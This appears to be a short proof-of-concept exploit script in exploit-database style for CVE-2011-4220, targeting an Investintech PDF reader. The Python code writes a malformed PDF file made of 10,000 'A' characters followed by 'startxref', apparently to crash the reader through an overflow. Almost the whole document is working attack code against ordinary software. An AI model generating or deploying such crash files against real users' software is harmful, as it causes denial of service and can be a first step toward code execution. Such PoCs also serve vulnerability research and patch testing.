# Exploit Title:
# Date: June 24 2012
# Exploit Author: Carlos Mario Penagos Hollmann
# Vendor Homepage: www.investintech.com
# Version:1.0
# Tested on: Windows 7
# CVE : cve-2011-4220
 
 
payload ="A"*10000
crash="startxref"
pdf=payload+crash
 
filename = "slimpdPoC.pdf"
file = open(filename,"w")
file.writelines(pdf)
file.close()